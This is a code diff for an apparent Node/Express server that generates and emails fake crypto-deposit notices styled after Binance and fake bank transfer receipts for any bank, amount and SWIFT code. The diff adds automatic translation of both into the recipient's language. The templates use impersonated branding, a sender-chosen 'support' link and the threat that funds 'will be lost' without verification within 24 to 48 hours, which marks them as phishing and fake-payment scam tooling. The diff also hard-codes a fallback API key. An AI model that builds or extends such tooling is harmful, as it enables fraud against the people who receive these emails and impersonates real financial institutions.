@@ -305,9 +305,519 @@ function generateCryptoEmailTemplate(data: { platform: string; status: string; c
   `;
 }
 
+// --- Translation Services ---
+
+/**
+ * Translates an array of texts to a target language using the Lecto AI Translation API.
+ */
+async function translateTexts(texts: string[], toLang: string, fromLang: string = "en"): Promise<string[]> {
+  const apiKey = process.env.LECTO_AI_API_KEY || "6975CTA-8NS4767-HZARC8H-YCHBGDN";
+  if (!toLang || toLang === "en" || !apiKey) {
+    return texts;
+  }
+  
+  // Normalize target language code (e.g. "en-US" -> "en", but keeping "ceb" or "th" intact)
+  let targetLang = toLang.toLowerCase().trim();
+  if (targetLang.includes("-")) {
+    targetLang = targetLang.split("-")[0];
+  }
+  if (targetLang === "en") {
+    return texts;
+  }
+
+  try {
+    console.log(`Calling Lecto AI to translate ${texts.length} texts to "${targetLang}"...`);
+    const response = await fetch("https://api.lecto.ai/v1/translate/text", {
+      method: "POST",
+      headers: {
+        "X-API-Key": apiKey,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        texts,
+        to: [targetLang],
+        from: fromLang
+      })
+    });
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error(`Lecto AI API Error (status ${response.status}):`, errorText);
+      return texts;
+    }
+
+    const data: any = await response.json();
+    console.log("Lecto AI Response status: success");
+
+    if (data && data.translations && data.translations[0] && Array.isArray(data.translations[0].translated)) {
+      return data.translations[0].translated;
+    }
+    
+    if (data && Array.isArray(data.translated_texts)) {
+      return data.translated_texts;
+    }
+    if (data && Array.isArray(data.translations)) {
+      if (typeof data.translations[0] === "string") {
+        return data.translations;
+      }
+    }
+    
+    return texts;
+  } catch (error) {
+    console.error("Lecto AI translation failed:", error);
+    return texts;
+  }
+}
+
+/**
+ * Generates translated HTML content and subject line for Crypto deposits using Lecto AI.
+ */
+async function renderTranslatedCryptoEmail(params: {
+  platform: string;
+  status: string;
+  crypto: string;
+  amount: string;
+  supportLink: string;
+  warningMessage?: string;
+  language?: string;
+  logoCid?: string;
+}): Promise<{ html: string; subject: string }> {
+  const { platform, status, crypto, amount, supportLink, warningMessage, language, logoCid } = params;
+  const year = new Date().getFullYear();
+
+  // 1. Define source texts
+  const sourceTexts = [
+    `${crypto} Deposit ${status} - ${platform}`, // 0: Subject
+    `${crypto} Deposit ${status}`, // 1: Heading
+    `Your deposit of ${amount} ${crypto} is now ${status.toLowerCase()} in your ${platform} account. Log in to check your balance. Read our FAQs if you are running into problems.`, // 2: Body
+    `Visit Your Dashboard`, // 3: Button
+    `Contact customer support to verify your payment within 24 to 48 hours or your funds will be lost.`, // 4: Support text
+    `This is an automated message, please do not reply, only reply to customer support.`, // 5: Automated message
+    `Stay connected!`, // 6: Stay connected
+    `Anti-phishing`, // 7: Anti phishing title
+    `To stay secure, setup your anti-phishing code here`, // 8: Anti phishing sub
+    `Disclaimer: Digital asset prices are subject to high market risk and price volatility. The value of your investment may go down or up, and you may not get back the amount invested. You are solely responsible for your investment decisions and ${platform} is not liable for any losses you may incur. Past performance is not a reliable predictor of future performance. You should only invest in products you are familiar with and where you understand the risks.`, // 9: Disclaimer
+    warningMessage || "" // 10: Warning Message
+  ];
+
+  // 2. Translate texts
+  const targetLang = language || "en";
+  const translatedTexts = await translateTexts(sourceTexts, targetLang);
+
+  const subject = translatedTexts[0];
+  const heading = translatedTexts[1];
+  const bodyText = translatedTexts[2];
+  const buttonText = translatedTexts[3];
+  const supportText = translatedTexts[4];
+  const automatedText = translatedTexts[5];
+  const stayConnected = translatedTexts[6];
+  const antiPhishing = translatedTexts[7];
+  const antiPhishingSub = translatedTexts[8];
+  const disclaimerText = translatedTexts[9];
+  const translatedWarning = warningMessage ? translatedTexts[10] : "";
+
+  // 3. Render HTML
+  const headerContent = logoCid 
+    ? `<img src="cid:${logoCid}" alt="${platform}" style="max-height: 40px; width: auto;" />`
+    : `<span style="color: #fcd535; font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px;">${platform}</span>`;
+
+  const supportHref = supportLink.includes('@') ? `mailto:${supportLink}` : supportLink;
+
+  const warningHtml = translatedWarning ? `
+    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom: 24px; background-color: #fce8e6; border-left: 4px solid #dc2626; border-radius: 8px; width: 100%; border-collapse: separate;">
+      <tr>
+        <td style="padding: 14px 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #991b1b; font-weight: 600; line-height: 1.5; text-align: left; vertical-align: middle;">
+          <span style="font-size: 16px; margin-right: 8px; vertical-align: middle;">⚠️</span>
+          <span style="vertical-align: middle;">${translatedWarning}</span>
+        </td>
+      </tr>
+    </table>
+  ` : '';
+
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>${subject}</title>
+    </head>
+    <body style="margin: 0; padding: 0; background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+      <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #ffffff;">
+        <tr>
+          <td align="center">
+            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
+              <!-- Header -->
+              <tr>
+                <td style="background-color: #1e2329; padding: 20px; text-align: center;">
+                  ${headerContent}
+                </td>
+              </tr>
+              
+              <!-- Content -->
+              <tr>
+                <td style="padding: 40px 30px;">
+                  <h1 style="font-size: 24px; font-weight: 700; color: #1e2329; margin: 0 0 20px 0;">${heading}</h1>
+                  
+                  <p style="font-size: 16px; color: #474d57; line-height: 1.5; margin: 0 0 20px 0;">
+                    ${bodyText}
+                  </p>
+                  
+                  ${warningHtml}
+                  
+                  <table border="0" cellpadding="0" cellspacing="0" style="margin: 30px 0;">
+                    <tr>
+                      <td align="center" style="background-color: #fcd535; border-radius: 4px;">
+                        <a href="#" style="display: inline-block; padding: 12px 24px; font-size: 16px; font-weight: 700; color: #1e2329; text-decoration: none;">${buttonText}</a>
+                      </td>
+                    </tr>
+                  </table>
+                  
+                  <p style="font-size: 14px; color: #707a8a; line-height: 1.5; margin: 30px 0 0 0;">
+                    <a href="${supportHref}" style="color: #c99400; text-decoration: none; font-weight: 600;">${supportText}</a>
+                  </p>
+                  
+                  <p style="font-size: 14px; font-style: italic; color: #707a8a; margin: 20px 0 0 0;">
+                    ${automatedText}
+                  </p>
+                </td>
+              </tr>
+              
+              <!-- Divider -->
+              <tr>
+                <td style="padding: 0 30px;">
+                  <div style="border-top: 1px solid #eaecef;"></div>
+                </td>
+              </tr>
+              
+              <!-- Footer Socials -->
+              <tr>
+                <td align="center" style="padding: 30px 0;">
+                  <p style="font-size: 14px; font-weight: 700; color: #fcd535; margin: 0 0 15px 0;">${stayConnected}</p>
+                  <table border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/x.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/telegram.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/facebook.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/instagram.png" width="20" height="20" /></td>
+                    </tr>
+                  </table>
+                </td>
+              </tr>
+              
+              <!-- Footer Disclaimer -->
+              <tr>
+                <td style="padding: 0 30px 40px 30px;">
+                  <div style="background-color: #fcd535; border-radius: 4px; display: inline-block; padding: 4px 12px; margin-bottom: 15px;">
+                    <span style="font-size: 12px; font-weight: 700; color: #1e2329;">${antiPhishing}</span>
+                  </div>
+                  <p style="font-size: 12px; color: #707a8a; margin: 0 0 20px 0;">${antiPhishingSub}</p>
+                  
+                  <p style="font-size: 11px; color: #707a8a; line-height: 1.4; margin: 0;">
+                    ${disclaimerText}
+                  </p>
+                  <p style="font-size: 11px; color: #707a8a; line-height: 1.4; margin: 15px 0 0 0;">
+                    © ${year} <a href="#" style="color: #c99400; text-decoration: none;">${platform}</a>.com, All Rights Reserved.
+                  </p>
+                </td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+      </table>
+    </body>
+    </html>
+  `;
+
+  return { html, subject };
+}
+
+/**
+ * Generates translated HTML content and subject line for bank receipts using Lecto AI.
+ */
+async function renderTranslatedBankReceipt(tx: Transaction, isReceiver: boolean): Promise<{ html: string; subject: string }> {
+  const targetLang = tx.language || "en";
+  const formattedDate = new Date(tx.date).toLocaleDateString("en-US", {
+    month: "long",
+    day: "numeric",
+    year: "numeric"
+  }) + " " + new Date(tx.date).toLocaleTimeString("en-US", {
+    hour: "numeric",
+    minute: "2-digit",
+    hour12: true
+  });
+
+  const formattedSupportLink = tx.supportLink.includes("@") && !tx.supportLink.startsWith("mailto:")
+    ? `mailto:${tx.supportLink}`
+    : tx.supportLink;
+
+  const displayBankName = tx.bankName.toUpperCase();
+  const secureBankName = tx.bankName.replace(/\s+/g, '').toUpperCase();
+
+  // 1. Define source texts
+  const sourceTexts = [
+    // Subject (Sender / Receiver)
+    isReceiver 
+      ? `${tx.bankName} - Inward Credit Notification (Ref: ${tx.id})`
+      : `${tx.bankName} - Transaction Confirmation (Ref: ${tx.id})`, // 0: Subject
+    `Payment Notification - ${tx.id}`, // 1: Title
+    `Official Receipt`, // 2: Subtitle
+    `TRANSACTION AMOUNT`, // 3: Transaction Amount Header
+    `Transaction Details`, // 4: Details Section Header
+    `Receiver Name`, // 5: Label Receiver Name
+    `Sender Name`, // 6: Label Sender Name
+    `Account Number`, // 7: Label Account Number
+    `SWIFT Code`, // 8: Label SWIFT Code
+    `Transaction ID`, // 9: Label Transaction ID
+    `Date/Time`, // 10: Label Date/Time
+    `Status`, // 11: Label Status
+    tx.status.toUpperCase(), // 12: Status Value text
+    `Secured by ${secureBankName} advanced encryption technology.`, // 13: Secured text
+    `For assistance, please contact support.`, // 14: Support text
+    tx.receiver.redBoxMessage || "" // 15: Red Box warning
+  ];
+
+  // 2. Translate texts
+  const translatedTexts = await translateTexts(sourceTexts, targetLang);
+
+  const subject = translatedTexts[0];
+  const titleText = translatedTexts[1];
+  const subtitleText = translatedTexts[2];
+  const amountHeader = translatedTexts[3];
+  const sectionHeader = translatedTexts[4];
+  const receiverLabel = translatedTexts[5];
+  const senderLabel = translatedTexts[6];
+  const accountLabel = translatedTexts[7];
+  const swiftLabel = translatedTexts[8];
+  const txIdLabel = translatedTexts[9];
+  const dateTimeLabel = translatedTexts[10];
+  const statusLabel = translatedTexts[11];
+  const statusValue = translatedTexts[12];
+  const securedText = translatedTexts[13];
+  const supportText = translatedTexts[14];
+  const translatedRedBoxMessage = (isReceiver && tx.receiver.redBoxMessage) ? translatedTexts[15] : "";
+
+  // 3. Render HTML
+  const redBoxHtml = translatedRedBoxMessage
+    ? `
+      <table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom: 24px; background-color: #fce8e6; border-left: 4px solid #dc2626; border-radius: 8px; width: 100%; border-collapse: separate;">
+        <tr>
+          <td style="padding: 14px 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #991b1b; font-weight: 600; line-height: 1.5; text-align: left; vertical-align: middle;">
+            <span style="font-size: 16px; margin-right: 8px; vertical-align: middle;">⚠️</span>
+            <span style="vertical-align: middle;">${translatedRedBoxMessage}</span>
+          </td>
+        </tr>
+      </table>
+    `
+    : "";
+
+  const supportLineHtml = supportText.includes("support")
+    ? supportText.replace(/contact support|support/gi, (m) => `<a href="${formattedSupportLink}" target="_blank" style="color: #3b82f6; text-decoration: underline; font-weight: 600;">${m}</a>`)
+    : `<a href="${formattedSupportLink}" target="_blank" style="color: #3b82f6; text-decoration: underline; font-weight: 600;">${supportText}</a>`;
+
+  let statusBg = "#16a34a";
+  if (tx.status === "pending") statusBg = "#d97706";
+  if (tx.status === "failed") statusBg = "#dc2626";
+
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>${subject}</title>
+    </head>
+    <body style="margin: 0; padding: 0; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -webkit-text-size-adjust: none;">
+      <table border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout: fixed; background-color: transparent; padding: 32px 12px;">
+        <tr>
+          <td align="center" style="vertical-align: top;">
+            <table border="0" cellpadding="0" cellspacing="0" style="max-width: 520px; width: 100%; text-align: left; background-color: transparent;">
+              
+              <!-- 1. TOP HEADER TEXT -->
+              <tr>
+                <td style="padding: 0 4px 20px 4px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                  <div style="font-size: 19px; font-weight: 700; color: #000000; line-height: 1.25; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                    ${titleText}
+                  </div>
+                  <div style="font-size: 13px; color: #555555; margin-top: 4px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                    ${subtitleText}
+                  </div>
+                </td>
+              </tr>
+
+              <!-- 2. LOGO BANNER -->
+              <tr>
+                <td style="padding-bottom: 24px;">
+                  <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0d2149; border-radius: 8px; width: 100%;">
+                    <tr>
+                      <td align="center" style="padding: 16px 20px; vertical-align: middle; text-align: center;">
+                        <table border="0" cellpadding="0" cellspacing="0" style="display: inline-table; margin: 0 auto;">
+                          <tr>
+                            ${tx.logoUrl ? `
+                              <td style="vertical-align: middle; padding-right: 12px;">
+                                <img src="${tx.logoUrl}" alt="${tx.bankName} Logo" style="height: 40px; width: auto; max-width: 120px; border-radius: 4px; background: white; padding: 2px;" />
+                              </td>
+                            ` : `
+                              <td style="vertical-align: middle; padding-right: 12px; font-size: 32px; line-height: 1;">
+                                🏦
+                              </td>
+                            `}
+                            <td style="vertical-align: middle; font-family: 'Arial Black', -apple-system, sans-serif; font-size: 26px; font-weight: 900; color: #4f83f7; letter-spacing: 2px; text-transform: uppercase;">
+                              ${displayBankName}
+                            </td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                </td>
+              </tr>
+
+              <!-- 3. TRANSACTION AMOUNT -->
+              <tr>
+                <td style="padding-bottom: 24px; text-align: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                  <div style="font-size: 13px; font-weight: 800; color: #000000; letter-spacing: 1px; margin-bottom: 4px; text-transform: uppercase;">
+                    ${amountHeader}
+                  </div>
+                  <div style="font-size: 32px; font-weight: 700; color: #000000;">
+                    ${tx.currency.symbol}${tx.amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </div>
+                </td>
+              </tr>
+
+              <!-- 4. WARNING NOTICE BOX -->
+              ${redBoxHtml ? `
+              <tr>
+                <td>
+                  ${redBoxHtml}
+                </td>
+              </tr>
+              ` : ""}
+
+              <!-- 5. TRANSACTION DETAILS SECTION -->
+              <tr>
+                <td style="padding-bottom: 28px;">
+                  <!-- Section Heading -->
+                  <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; text-align: left; margin-bottom: 14px;">
+                    <span style="font-size: 15px; font-weight: 800; color: #0b2545; border-bottom: 2px solid #0b2545; padding-bottom: 4px; display: inline-block;">
+                      ${sectionHeader}
+                    </span>
+                  </div>
+
+                  <!-- Details Card -->
+                  <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #ffffff; border: 1px solid #d1d5db; border-radius: 8px; overflow: hidden; width: 100%; border-collapse: separate;">
+                    <tr>
+                      <td style="padding: 8px 16px;">
+                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                          
+                          <!-- Receiver Name -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${receiverLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb;">
+                              ${tx.receiver.fullName}
+                            </td>
+                          </tr>
+
+                          <!-- Sender Name -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${senderLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb;">
+                              ${tx.sender.fullName}
+                            </td>
+                          </tr>
+
+                          <!-- Account Number -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${accountLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb; font-family: monospace;">
+                              ${tx.receiver.accountNumber}
+                            </td>
+                          </tr>
+
+                          <!-- SWIFT Code -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${swiftLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb; font-family: monospace;">
+                              ${tx.receiver.swiftCode}
+                            </td>
+                          </tr>
+
+                          <!-- Transaction ID -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${txIdLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb; font-family: monospace;">
+                              ${tx.id}
+                            </td>
+                          </tr>
+
+                          <!-- Date/Time -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left; border-bottom: 1px solid #e5e7eb;">
+                              ${dateTimeLabel}
+                            </td>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #000000; text-align: right; border-bottom: 1px solid #e5e7eb;">
+                              ${formattedDate}
+                            </td>
+                          </tr>
+
+                          <!-- Status -->
+                          <tr>
+                            <td style="padding: 11px 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; font-weight: 700; color: #0b2545; text-align: left;">
+                              ${statusLabel}
+                            </td>
+                            <td style="padding: 11px 0; text-align: right; vertical-align: middle;">
+                              <span style="background-color: ${statusBg}; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11px; font-weight: 700; padding: 4px 14px; border-radius: 9999px; text-transform: uppercase; letter-spacing: 0.5px; display: inline-block;">
+                                ${statusValue}
+                              </span>
+                            </td>
+                          </tr>
+
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                </td>
+              </tr>
+
+              <!-- 6. FOOTER TEXT -->
+              <tr>
+                <td style="padding-top: 4px; text-align: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                  <!-- Secured padlock line -->
+                  <div style="font-size: 11.5px; color: #555555; font-weight: 500; display: inline-block; text-align: center; margin-bottom: 6px;">
+                    <span style="font-size: 13px; margin-right: 4px; vertical-align: middle;">🔒</span>
+                    <span style="vertical-align: middle;">${securedText}</span>
+                  </div>
+                  <!-- Support Assistance Line -->
+                  <div style="font-size: 11.5px; color: #555555; font-weight: 500; margin-top: 2px;">
+                    ${supportLineHtml}
+                  </div>
+                </td>
+              </tr>
+
+            </table>
+          </td>
+        </tr>
+      </table>
+    </body>
+    </html>
+  `;
+
+  return { html, subject };
+}
+
 // POST endpoint for Crypto Transfer Email
 app.post(["/api/send-crypto-email", "/send-crypto-email"], async (req: Request, res: Response) => {
-  const { senderEmail, receiverEmail, crypto, amount, platform, status, supportLink, warningMessage, logoImage } = req.body;
+  const { senderEmail, receiverEmail, crypto, amount, platform, status, supportLink, warningMessage, logoImage, language } = req.body;
   
   if (!receiverEmail || !crypto || !amount || !platform || !status || !supportLink) {
     res.status(400).json({ error: "Missing required fields" });
@@ -324,8 +834,16 @@ app.post(["/api/send-crypto-email", "/send-crypto-email"], async (req: Request, 
 
   try {
     const logoCid = logoImage ? 'platform-logo' : undefined;
-    const htmlContent = generateCryptoEmailTemplate({ platform, status, crypto, amount, supportLink, warningMessage, logoCid });
-    const subject = `${crypto} Deposit ${status} - ${platform}`;
+    const { html: htmlContent, subject } = await renderTranslatedCryptoEmail({
+      platform,
+      status,
+      crypto,
+      amount,
+      supportLink,
+      warningMessage,
+      language,
+      logoCid
+    });
 
     const transporter = nodemailer.createTransport({
       host: "smtp.gmail.com",
@@ -781,7 +1299,7 @@ async function dispatchEmail(
 }
 
 // POST endpoint to generate previews for sender and receiver email templates
-app.post(["/api/preview-email", "/preview-email"], (req: Request, res: Response) => {
+app.post(["/api/preview-email", "/preview-email"], async (req: Request, res: Response) => {
   const { transaction } = req.body;
   if (!transaction) {
     res.status(400).json({ error: "Missing transaction parameters for preview" });
@@ -790,17 +1308,8 @@ app.post(["/api/preview-email", "/preview-email"], (req: Request, res: Response)
 
   try {
     const tx: Transaction = transaction;
-    const statusStyles = getStatusStyles(tx.status);
-    const senderSubject = `${tx.bankName} - Transaction Confirmation (Ref: ${tx.id})`;
-    const receiverSubject = `${tx.bankName} - Inward Credit Notification (Ref: ${tx.id})`;
-
-    const senderHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, false)
-      : generateModernBankTemplate(tx, false);
-
-    const receiverHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, true)
-      : generateModernBankTemplate(tx, true);
+    const { html: senderHtml, subject: senderSubject } = await renderTranslatedBankReceipt(tx, false);
+    const { html: receiverHtml, subject: receiverSubject } = await renderTranslatedBankReceipt(tx, true);
 
     res.json({
       senderSubject,
@@ -844,10 +1353,6 @@ app.post(["/api/send-transfer", "/send-transfer"], async (req: Request, res: Res
     return;
   }
 
-  const statusStyles = getStatusStyles(tx.status);
-  const senderSubject = `${tx.bankName} - Transaction Confirmation (Ref: ${tx.id})`;
-  const receiverSubject = `${tx.bankName} - Inward Credit Notification (Ref: ${tx.id})`;
-
   const results = {
     sender: false,
     receiver: false,
@@ -857,14 +1362,9 @@ app.post(["/api/send-transfer", "/send-transfer"], async (req: Request, res: Res
   const senderEmailToUse = gmailSenderEmail || mailjetSenderEmail || brevoSenderEmail;
 
   try {
-    // 1. Generate HTML contents
-    const senderHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, false)
-      : generateModernBankTemplate(tx, false);
-
-    const receiverHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, true)
-      : generateModernBankTemplate(tx, true);
+    // 1. Generate translated HTML contents & Subjects
+    const { html: senderHtml, subject: resolvedSenderSubject } = await renderTranslatedBankReceipt(tx, false);
+    const { html: receiverHtml, subject: resolvedReceiverSubject } = await renderTranslatedBankReceipt(tx, true);
 
     // 2. Send email to Sender
     if (sendSender) {
@@ -873,7 +1373,7 @@ app.post(["/api/send-transfer", "/send-transfer"], async (req: Request, res: Res
           tx.sender.email,
           tx.sender.fullName,
           tx.bankName,
-          senderSubject,
+          resolvedSenderSubject,
           senderHtml,
           senderEmailToUse,
           tx,
@@ -895,7 +1395,7 @@ app.post(["/api/send-transfer", "/send-transfer"], async (req: Request, res: Res
           tx.receiver.email,
           tx.receiver.fullName,
           tx.bankName,
-          receiverSubject,
+          resolvedReceiverSubject,
           receiverHtml,
           senderEmailToUse,
           tx,
@@ -989,13 +1489,9 @@ app.post(["/api/resend-email", "/resend-email"], async (req: Request, res: Respo
   const senderEmailToUse = gmailSenderEmail || mailjetSenderEmail || brevoSenderEmail;
 
   try {
-    const senderHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, false)
-      : generateModernBankTemplate(tx, false);
-
-    const receiverHtml = tx.emailTemplate === "minimal_clean"
-      ? generateMinimalCleanTemplate(tx, true)
-      : generateModernBankTemplate(tx, true);
+    // Generate translated HTML contents & Subjects
+    const { html: senderHtml, subject: resolvedSenderSubject } = await renderTranslatedBankReceipt(tx, false);
+    const { html: receiverHtml, subject: resolvedReceiverSubject } = await renderTranslatedBankReceipt(tx, true);
 
     // Send email to Sender
     if (sendSender) {
@@ -1004,7 +1500,7 @@ app.post(["/api/resend-email", "/resend-email"], async (req: Request, res: Respo
           tx.sender.email,
           tx.sender.fullName,
           tx.bankName,
-          senderSubject,
+          resolvedSenderSubject,
           senderHtml,
           senderEmailToUse,
           tx,
@@ -1024,7 +1520,7 @@ app.post(["/api/resend-email", "/resend-email"], async (req: Request, res: Respo
           tx.receiver.email,
           tx.receiver.fullName,
           tx.bankName,
-          receiverSubject,
+          resolvedReceiverSubject,
           receiverHtml,
           senderEmailToUse,
           tx,
